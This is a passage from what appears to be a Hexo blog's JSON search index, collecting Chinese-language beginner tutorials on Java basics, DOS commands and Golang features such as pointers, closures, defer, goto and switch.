3000000000L 123456789public FileName&#123; public static void main(String[] args) &#123; int a; //变量声明 int b = 1; //变量声明 b = 21; //变量使用 &#125;&#125; 注意事项 ​ 变量名不能重复 ​ float和long类型的字母后缀F和L不能丢 ​ 右侧数值不能超过左侧数据类型范围 ​ 没有赋值的变量不能使用 ​ 变量使用不能超过作用域范围 ​ 作用域：从定义变量的那行起,到直接所属的大括号结束为止 ​ 可以用一条语句创建多个变量","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java编译和运行","slug":"java00000Java编译和运行","date":"2020-02-03T03:22:30.000Z","updated":"2020-02-03T07:22:02.503Z","comments":true,"path":"2020/02/03/java00000Java编译和运行/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java00000Java编译和运行/","excerpt":"","text":"目录: 源文件后缀名 编写java源文件模板 编译和运行 注释 关键字 标识符 常量 数据类型 源文件后缀名 java的源文件后缀名为 *.java 编写java源文件模板 123456public filename&#123; public static void main(String [] args) &#123; System.out.println(\"Hello World.....\"); &#125;&#125; 其中filename对应着源文件名 System.out.println为输出函数 ,输出内容,结尾时换行 编译和运行 编译 javac 文件名 编译成功会生成一个class文件 运行 java 文件名 文件名后面不要带class后缀 注释 // 单行注释 /**/多行注释 1234567891011121314public filename&#123; public static void main(String [] args) &#123; //我是单行注释 /* 我是多行注释 我是多行注释 */ &#125;&#125; 关键字 ​ 特征 ​ 全部小写 ​ 在增强版记事本中有颜色 标识符 命名规则 可以包含字母，数字，下划线，$ 不能以数字开头 标识符不能是关键字 命名规范 类名 大驼峰式 :首字母大写，后面每个单词首字母大写 MyNmae 变量名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 方法名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 常量 程序运行期间，固定不变的量 1234567891011121314151617public filename&#123; public static void mian(String[] args) &#123; String a = \"abc\"; //字符串常量 int iZhengXing = 123; //整型常量 float fXiaoShu = 123.2F; //浮点型常量 char cZifu = 'c'; //字符常量 boolean isBool = true; //布尔型常量 //还有一个null 空常量 &#125;&#125; 数据类型 整型 byte， short， int， long 浮点型 ​ float，double 布尔型 ​ boolean 字符型 ​ char ​ 1234567891011121314151617181920public filename&#123; public static void mian(String[] args) &#123; /***********整型************/ byte bXinBie; //1个字节 short sXiaoZheng; //2个字节 int iRenLei; //4个字节 long lShaZi; //4个字节 /**********浮点型************/ float fFengShu; //4个字节 double dYuanZhouLv; //8个字节 /**********布尔型************/ boolean isOk; /**********字符型************/ char cPingFen; //1个字节 &#125;&#125; 注意事项 ​ 字符串不是基本类型，而是引用类型 ​ 浮点型可能只是一个近似值，并非精确值 ​ 数据范围与字节数不一定相关，例如float数据比long更加广泛，但是float更加广泛 ​ 浮点数默认是double类型，如果要用float类型要加后缀F ​ 整数默认类型是int，如果要用long，后缀要加L","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基础知识","slug":"java00000基础知识","date":"2020-02-03T03:22:30.000Z","updated":"2020-02-08T09:11:36.411Z","comments":true,"path":"2020/02/03/java00000基础知识/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java00000基础知识/","excerpt":"","text":"计算机基础知识 二进制 十进制转二进制 用辗转相除法: 二进制转十进制 用二进制分别乘以位权,在进行相加 存储单位 一般情况下最小单位为bit 1Byte = 8bit 1KB = 1024B 1MB = 1024KB 1GB = 1024MB 1TB = 1024GB 命令提示符 MS-DOS MS代表微软,DOS 代表 Disk Operating System （磁盘操作系统） 磁盘命令 改变磁盘符 直接 输入磁盘符 并按下回车 改变目录 cd 目录 按下tab键会自动补全 cd . . 返回上一层 cd \\ 回到根目录 dir遍历内容 dir . . 遍历上一层内容 dir . 遍历当前目录内容 dir 文件目录 遍历指定目录内容 dir 文件 遍历指定文件 cls 清屏 exit 退出DOS系统","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"个人简历","slug":"个人简历","date":"2019-12-07T10:59:46.000Z","updated":"2019-12-07T10:59:46.442Z","comments":true,"path":"2019/12/07/个人简历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人简历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"个人经历","slug":"个人经历","date":"2019-12-07T10:57:37.000Z","updated":"2019-12-07T10:57:37.110Z","comments":true,"path":"2019/12/07/个人经历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人经历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Golang 指针","slug":"201912050104","date":"2019-12-04T17:05:00.000Z","updated":"2019-12-04T17:06:13.569Z","comments":true,"path":"2019/12/05/201912050104/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/05/201912050104/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121package main/*%T 类型占位符%v 值占位符%p 地址（指针）占位符，只有地址才能替换%p&amp;value 对值取地址*addr 对地址取值**int 指向int型指针的指针作用：函数传参时，传递指针叫引用传递，值传递是拷贝式的，对被传参数的修改是不会改变本体的，想要改变本体只能是引用传递*/import \"fmt\"//指针就是地址//&amp;value 对值取地址//*ptr 对地址取值func main021() &#123; //声明变量a时，系统开辟了一块内存【地址】，里面存的【值】是123 var a int = 123 fmt.Printf(\"a的类型是%T\\n\", a)//int fmt.Printf(\"a的值是%v\\n\", a)//123 fmt.Printf(\"a的地址是%p\\n\", &amp;a)//0x... //&amp;a取变量a的地址 aPointer := &amp;a fmt.Printf(\"aPointer的类型是%T\\n\",aPointer)//*int //将aPointer指向的地址中的值修改为456 *aPointer = 456 fmt.Println(\"*aPointer=\",*aPointer)//456 //a的值就变成了456 fmt.Println(\"a=\",a)&#125;//先定义原始变量，修改其指针中的值，会直接改变原变量//指针如果没有重新赋值，永远指向同一块地址func main022() &#123; //系统给x分配了内存 var x = 456 fmt.Println(x)//456 //定义整型指针（存储整型数据的地址） //默认赋值为空&lt;nil&gt; var xPtr *int fmt.Println(\"xPtr=\", xPtr)//nil //aPtr指向x的地址 xPtr = &amp;x //将xPtr指向的地址中的值修改为789 *xPtr = 789 fmt.Println(x) //789 fmt.Println(xPtr) //0xc042052080 fmt.Println(&amp;x) //0xc042052080 fmt.Println(*xPtr) //789 fmt.Println(*xPtr == x) //true fmt.Println(xPtr == &amp;x) //true var y = 456 *xPtr = y fmt.Println(x) //456 fmt.Println(xPtr) //没有变 fmt.Println(&amp;x) //没有变 fmt.Println(*xPtr) //456 fmt.Println(*xPtr == y) //true fmt.Println(x == y) //true fmt.Println(&amp;x == &amp;y) //false fmt.Println(xPtr == &amp;y) //false fmt.Printf(\"y的地址是%p\\n\",&amp;y) fmt.Println(\"----------\") //xPtr指向y的地址 xPtr = &amp;y y = 789 fmt.Println(x) //456 fmt.Println(y) //789 fmt.Println(*xPtr) //789 fmt.Println(&amp;x == xPtr) //false&#125;//指针是严格检测数据类型的func main023() &#123; var x = 123 var intPtr *int intPtr = &amp;x fmt.Println(intPtr, *intPtr) //0x...,123 //var y = \"你妹\" //intPtr = &amp;y//编译错误，【整型指针】无法赋值为【字符串的地址】&#125;//指针的指针func main024() &#123; var x = 123 var mPtr *int = &amp;x //var mmp **int mmPtr := &amp;mPtr fmt.Println(mmPtr)//0xc042072018 fmt.Printf(\"mmPtr的类型是%T\\n\",mmPtr)//mmPtr的类型是**int //打印x的值 fmt.Println(*mPtr)//123 fmt.Println(*(*mmPtr))//123 fmt.Println(**mmPtr)//123&#125;func test()&#123;&#125;func main() &#123; //main021() //main022() //main023() main024()&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang指针","slug":"Golang指针","permalink":"https://xiaowuyoucy.github.io/tags/Golang指针/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-11-27T08:08:58.620Z","updated":"2019-11-27T08:08:58.620Z","comments":true,"path":"2019/11/27/hello-world/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/27/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new \"My New Post\" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"Golang闭包函数","slug":"201911190628","date":"2019-11-18T22:28:00.000Z","updated":"2019-11-30T17:34:35.064Z","comments":true,"path":"2019/11/19/201911190628/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190628/","excerpt":"","text":"闭包函数 闭包函数概述 闭包函数：返回函数的函数 闭包的好处：【内层函数的状态】被保存在闭包中 不使用闭包，就要开 辟多个全局变量来保存函数以外的数据 如果说这个函数被多方调用，大家都需要各保存各的数据，那么此时就需要开辟多个全局变量 具体使用哪个全局变量，还要在函数内做判断——增大了重复的代码量，令代码看起来比较垃圾 案例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package mainimport \"fmt\"/*李逵和武松的Study方法的逻辑是几乎一模一样的然而为了分别保存二人的学习进度，需要开辟两个全局变量，函数内部需要使用两条分支结构才能完成业务逻辑；如果是108将都来学习...此时代码的可复用性很差！*/var likuiProgress int //0var wusongProgress int //0func Study(name string,hours int) &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) if name==\"李逵\"&#123; likuiProgress += hours &#125;else if name==\"武松\"&#123; wusongProgress += hours &#125;&#125;func main081() &#123; Study(\"李逵\", 5) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",likuiProgress) Study(\"武松\", 15) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",wusongProgress)&#125;/*使用闭包函数优化Study每个人有不同的学习进度，将这个进度保存在【各自的闭包】中*//*闭包函数：返回函数的函数闭包函数的好处：使用同一份内层函数代码，创建出任意多个不同的函数对象，这些对象各自的状态都被保存在函数闭包（外层函数）中，各行其道互不干扰*/func GetStudyFunc(name string) func(hours int) (progress int) &#123; //用于保存内层函数的状态 var progress int //定义内层函数 studyFunc := func(hours int) int &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) //更新内层函数在闭包中的状态 progress += hours return progress &#125; fmt.Printf(\"study的类型是%T\\n\", studyFunc) //返回内层函数 return studyFunc&#125;func main() &#123; //调用闭包函数，得到三个【代码相同的不同函数对象】 studyFunc1 := GetStudyFunc(\"李逵\") studyFunc2 := GetStudyFunc(\"武松\") studyFunc3 := GetStudyFunc(\"鲁智深\") //交替执行这些内层函数，其状态的更新会被其函数闭包所保存 lkProgress := studyFunc1(5) lzsProgress := studyFunc3(17) wsProgress := studyFunc2(15) lkProgress = studyFunc1(3) lzsProgress = studyFunc3(12) lkProgress = studyFunc1(2) wsProgress = studyFunc2(13) //输出结果，三个函数的各自的状态没有互相影响 fmt.Printf(\"李逵的学习进度是%d/10000\\n\",lkProgress) fmt.Printf(\"武松的学习进度是%d/10000\\n\",wsProgress) fmt.Printf(\"鲁智深的学习进度是%d/10000\\n\",lzsProgress)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang闭包函数","slug":"Golang闭包函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang闭包函数/"}]},{"title":"Golang匿名函数","slug":"201911190625","date":"2019-11-18T22:26:00.000Z","updated":"2019-11-18T22:27:43.510Z","comments":true,"path":"2019/11/19/201911190625/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190625/","excerpt":"","text":"匿名函数概述 匿名函数的主要作用是封装一段一次性执行的代码 它无所谓复用，所以无需起名，之所以进行封装的意义，在于使一段代码成为一个整体 defer延时执行一段代码，和go并发执行一段代码是匿名函数的常用场景 123456789101112131415161718//匿名函数func main() &#123;//延时执行的匿名函数defer func() &#123;fmt.Println(\"劳资延时·无名，劳资最后执行\")&#125;()//并发执行的匿名函数go func() &#123;fmt.Println(\"劳资并发·无名，劳资并发执行\")&#125;()//一个带参的匿名函数ret := func(a, b int) int &#123;fmt.Println(\"劳资普通·无名，下面劳资睡一会\")time.Sleep(1)return a + b&#125;(2, 3)fmt.Println(ret)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang匿名函数","slug":"Golang匿名函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang匿名函数/"}]},{"title":"函数","slug":"201911190615","date":"2019-11-18T22:15:00.000Z","updated":"2019-11-18T22:23:31.611Z","comments":true,"path":"2019/11/19/201911190615/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190615/","excerpt":"","text":"函数概述 函数是对一段能够重复使用的代码的封装 函数的参数定义了外界给函数输入的数据 函数的返回值定义了函数给外界输出的数据 Go语言函数支持不定长参数和多个返回值 @函数定义和调用 123456//定义函数func sayHello() &#123;fmt.Println(\"fuck off!\")&#125;//调用函数sayHello() @函数参数 无参函数 123func add0() &#123;fmt.Println(\"没参数，add你妹啊\")&#125; 带参函数 1234func add1(a int) &#123;fmt.Println(\"收到一个参数\", a)fmt.Println(\"一个参数，add你妹啊\")&#125; 多个参数 123456789101112//多个参数func addm1(a int, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型相同的参数被合写在一起了func addm2(a, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型不同的参数func addm3(a, b int, c float32) &#123;fmt.Println(\"加和是\", float32(a)+float32(b)+c)&#125; 不定长参数 1234567891011121314func addx(x ...int) &#123;//参数的长度是 5fmt.Println(\"参数的长度是\", len(x))//参数的类型是[]intfmt.Printf(\"参数的类型是%T\\n\", x)var result = 0//遍历不定长参数for i, v := range x &#123;fmt.Println(i, v)result += v&#125;//加和是 15fmt.Println(\"加和是\", result)&#125; @函数返回值 无返回值 1234//无返回值func sub0(a, b int) &#123;fmt.Println(\"相减的结果是\", a-b)&#125; 有返回值 12345678910//有返回值func sub11(a, b int) int &#123;fmt.Println(\"相减的结果是\", a-b)return a - b&#125;func sub12(a, b int) (ret int) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - breturn&#125; 多个返回值 1234567891011//多个返回值func subm1(a, b int) (int, string) &#123;fmt.Println(\"相减的结果是\", a-b)return a - b, \"你妹\"&#125;func subm2(a, b int) (ret int, remark string) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - bremark = \"你妹\"return&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang函数","slug":"Golang函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang函数/"}]},{"title":"Golang延时执行defer","slug":"201911190306","date":"2019-11-18T19:09:00.000Z","updated":"2019-11-18T19:21:46.056Z","comments":true,"path":"2019/11/19/201911190306/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190306/","excerpt":"","text":"defer概述 defer xxx() 延时执行，将xxx放在函数的最后执行 多个defer xxx()时,所有defer倒序执行，即最早声明 的defer会最后执行 用途 (数据库读写，文件读写，网络数据读写) 资源=数据库连接，打开的文件对象，网路连接 资源开销（CPU，内存，磁盘…）巨大 资源，随用随开，用完【即】关 场景 O只是场景之一 其它场景：消费完毕要买单，运动完要洗澡，自习结束要关灯… 读写数据库，并在程序的最后关闭数据库 12345678func demo41() &#123;//随用随开，用完【即】关fmt.Println(\"打开数据库\")//defer所唤起的函数将在函数结束前才执行defer closeDatabase()fmt.Println(\"愉快地读写数据\")fmt.Println(\"读写完毕\")&#125; 多个defer时，最早defer的操作最后执行 12345678910111213141516171819202122func demo42() &#123;//打开数据库fmt.Println(\"打开数据库\")defer closeDatabase()//读入DB数据fmt.Println(\"读入DB数据\")//打开文件fmt.Println(\"打开文件\")defer closeFile()//向文件中写出DB中的数据fmt.Println(\"读入DB数据\")//关闭文件//继续操作数据库fmt.Println(\"继续操作数据库\")//关闭数据库&#125;func closeDatabase() &#123;fmt.Println(\"关闭数据库\")&#125;func closeFile() &#123;fmt.Println(\"关闭文件\")&#125; 其他defer案例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport \"fmt\"func xingzuoZhensuo() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\" &#123; fmt.Println(\"阁下真乃神人也\") &#125; else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\" &#123; fmt.Println(\"阁下是天秤座\") &#125; else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\" &#123; fmt.Println(\"阁下是天蝎座\") &#125; else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\" &#123; fmt.Println(\"阁下是射手座\") &#125; else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday &gt;= \"0101\" &amp;&amp; birthday &lt;= \"0122\") &#123; fmt.Println(\"阁下是摩羯座\") &#125; else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\" &#123; fmt.Println(\"阁下是水瓶座\") &#125; else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\") || (birthday &gt;= \"0301\" &amp;&amp; birthday &lt;= \"0322\") &#123; fmt.Println(\"阁下是双鱼座\") &#125; else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\" &#123; fmt.Println(\"阁下是白羊座\") &#125; else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\" &#123; fmt.Println(\"阁下是金牛座\") &#125; else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\" &#123; fmt.Println(\"阁下是双子座\") &#125; else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= \"0722\" &#123; fmt.Println(\"阁下是巨蟹座\") &#125; else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\" &#123; fmt.Println(\"阁下是狮子座\") &#125; else &#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125;func main071() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") //挂起一个延时任务（在当前函数返回（结束）前执行） defer fmt.Println(\"同志再见，我院永远欢迎你！\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;/*·诊断完毕后连续输出“您的诊断已结束”,“请这边滚”，“我院永远欢迎你”*/func main() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") /*多个defer时，执行顺序是倒置的*/ //第1个defer会倒数第1个执行 defer fmt.Println(\"我院永远欢迎你\") //第2个defer会倒数第2个执行 defer fmt.Println(\"请这边滚\") //第3个defer会倒数第3个执行 defer fmt.Println(\"您的诊断已结束\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"延时执行defer","slug":"延时执行defer","permalink":"https://xiaowuyoucy.github.io/tags/延时执行defer/"}]},{"title":"Golang的跳转语句（GOTO）","slug":"201911190123","date":"2019-11-18T17:25:00.000Z","updated":"2019-11-18T17:26:00.356Z","comments":true,"path":"2019/11/19/201911190123/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190123/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( \"fmt\" \"time\")func main() &#123;STUDYHARD: fmt.Println(\"开始努力奋斗！\") var i int = 0 for &#123; fmt.Printf(\"努力奋斗了%d小时\\n\", i) time.Sleep(500 * time.Millisecond) i++ if i &gt; 10 &#123; //跳出当前循环 //break fmt.Println(\"恭喜你获得了组织颁发的奖状！\") goto TRYAGIN &#125; &#125; BONUS: fmt.Println(\"循环外的世界\") fmt.Println(\"送你海景别野一套\") fmt.Println(\"送你满汉全席一套\") fmt.Println(\"送你我厂生产的女朋友一个\")TRYAGIN: var answer string fmt.Println(\"要不要再玩一次呢？Y/N\") fmt.Scan(&amp;answer) if answer == \"N\" &#123; goto GAMEOVER &#125; else if answer == \"Y\" &#123; goto STUDYHARD &#125;else if answer == \"FUCKOFF\"&#123; goto BONUS &#125;GAMEOVER: fmt.Println(\"GAME OVER\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"GOTO语句","slug":"GOTO语句","permalink":"https://xiaowuyoucy.github.io/tags/GOTO语句/"}]},{"title":"Golang流程控制","slug":"201911182336","date":"2019-11-18T15:37:00.000Z","updated":"2019-11-18T16:01:40.381Z","comments":true,"path":"2019/11/18/201911182336/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911182336/","excerpt":"","text":"if else 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport \"fmt\"/*字符串比大小比首字符在字符集中出现的序号，首字符相同则比较第二个字符，以此类推go的编译器默认使用UTF8字符集在UTF8字符集中数字出现的顺序为：0123456789*/func main031() &#123; fmt.Println(\"0\"&gt;\"9\") fmt.Println(\"012\"&gt;\"011\") fmt.Println(\"0823\"&gt;\"0423\")&#125;/*根据用户输入的生日判断其星座：①单分支：如果位于0823-0922之间（处女座），输出“阁下真乃神人也！”*/func main032() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday&lt;=\"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125; fmt.Println(\"诊断结束！\")&#125;/*根据用户输入的生日判断其星座：②双分支：如果位于0823-0922之间（处女座），输出“阁下乃神人也！”，否则输出“垃圾”*/func main033() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt; \"0822\" &amp;&amp; birthday &lt; \"0923\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else&#123; fmt.Println(\"乐色\") &#125;&#125; else if 多分支 1234567891011121314151617181920212223242526272829303132333435363738/*根据用户输入的生日判断其星座：③多分支：判断其具体星座*/func main034() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\"&#123; fmt.Println(\"阁下是天秤座\") &#125;else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\"&#123; fmt.Println(\"阁下是天蝎座\") &#125;else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\"&#123; fmt.Println(\"阁下是射手座\") &#125;else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday&gt;=\"0101\" &amp;&amp; birthday&lt;=\"0122\")&#123; fmt.Println(\"阁下是摩羯座\") &#125;else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\"&#123; fmt.Println(\"阁下是水瓶座\") &#125;else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\")||(birthday&gt;=\"0301\" &amp;&amp; birthday&lt;=\"0322\")&#123; fmt.Println(\"阁下是双鱼座\") &#125;else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\"&#123; fmt.Println(\"阁下是白羊座\") &#125;else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\"&#123; fmt.Println(\"阁下是金牛座\") &#125;else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\"&#123; fmt.Println(\"阁下是双子座\") &#125;else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= \"0722\"&#123; fmt.Println(\"阁下是巨蟹座\") &#125;else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\"&#123; fmt.Println(\"阁下是狮子座\") &#125;else&#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125; SWITCH 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package mainimport \"fmt\"/*@星座诊所2(switch)根据用户输入的出生月份猜测其星座：·白羊（4） 金牛（5） 双子（6） 巨蟹（7） 狮子（8） 处女（9） 天平（10） 天蝎（11） 射手（12） 摩羯（1） 水瓶（2） 双鱼（3）·使用单点case判断其星座；·使用单点case集合判断其季节（春夏秋冬）·使用自由条件case判断用户具体星座*/func main041() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) fmt.Printf(\"month=%d\", month) /* 对month的可能取值，做单点判断 */ switch month &#123; case 1: fmt.Printf(\"你大概率是%s座\\n\", \"摩羯\") case 2: fmt.Printf(\"你大概率是%s座\\n\", \"水瓶\") case 3: fmt.Printf(\"你大概率是%s座\\n\", \"双鱼\") case 4: fmt.Printf(\"你大概率是%s座\\n\", \"白羊\") case 5: fmt.Printf(\"你大概率是%s座\\n\", \"金牛\") case 6: fmt.Printf(\"你大概率是%s座\\n\", \"双子\") case 7: fmt.Printf(\"你大概率是%s座\\n\", \"巨蟹\") case 8: fmt.Printf(\"你大概率是%s座\\n\", \"狮子\") case 9: fmt.Printf(\"你大概率是%s座\\n\", \"处女\") case 10: fmt.Printf(\"你大概率是%s座\\n\", \"天平\") case 11: fmt.Printf(\"你大概率是%s座\\n\", \"天蝎\") case 12: fmt.Printf(\"你大概率是%s座\\n\", \"射手\") //month的值没有落在上述任何一种情形中 //default是可选的 default: fmt.Println(\"你就是传说中的蛇夫座\") &#125;&#125;/*·使用单点case集合判断其季节（春夏秋冬）*/func main042() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) switch month &#123; case 12, 1, 2: fmt.Println(\"你出生在冬天\") case 3, 4, 5: fmt.Println(\"你出生在春天\") case 6, 7, 8: fmt.Println(\"你出生在夏天\") case 9, 10, 11: fmt.Println(\"你出生在秋天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*·使用自由条件case判断其季节（春夏秋冬）*/func main043() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*使用fallthrough强制滚动到下一个分支并执行*/func main044() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") //强制执行下一个分支条件 fallthrough case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") fmt.Println(\"我们出生在上半年\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") //强制执行下一个分支条件 fallthrough case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") fmt.Println(\"我们出生在下半年\") default: fmt.Println(\"你出生在火星\") &#125;&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang流程控制","slug":"Golang流程控制","permalink":"https://xiaowuyoucy.github.io/tags/Golang流程控制/"}]},{"title":"Golang类型转换及移位运算","slug":"201911180045","date":"2019-11-17T16:46:00.000Z","updated":"2019-11-17T17:24:35.343Z","comments":true,"path":"2019/11/18/201911180045/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911180045/","excerpt":"","text":"类型转换 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/*类型转换强化整型和浮点型可以直接强制转换字符串和数值的转换用strconv.ParseInt和strconv.ParseFloat*/func main024() &#123; var a int = 123 var b float64 = 456.78 //将整型转换为浮点型 aFloat := float64(a) //%T类型占位符，%v是值占位符 fmt.Printf(\"aFloat的类型是%T,值是%v\\n\",aFloat,aFloat) //浮点型转整型，小数部分扔掉 //bInt := int32(b) bInt := int(b) fmt.Printf(\"bInt的类型是%T,值是%v\\n\",bInt,bInt) //字符串转整型 resultInt, _ := strconv.ParseInt(\"123\", 0, 64) fmt.Printf(\"resultInt的类型是%T,值是%v\\n\",resultInt,resultInt) //字符串转浮点型 resultFloat, _ := strconv.ParseFloat(\"123.45\", 64) fmt.Printf(\"resultFloat的类型是%T,值是%v\\n\",resultFloat,resultFloat)&#125;/*移位运算强化*/func main() &#123; //10111 var a uint8 = 23 fmt.Println(a&gt;&gt;3)//2 //左移 fmt.Println(a&lt;&lt;3)//184 //继续移动，从左侧溢出，当前无符号，最高位是数据位而非符号位 fmt.Println(a&lt;&lt;5)//224 //定义有符号8位整型 var b int8 = 23 //10111000,最高位为1，为负数，为补码，减一取反得其原码（原码到补码取反加一的逆向） 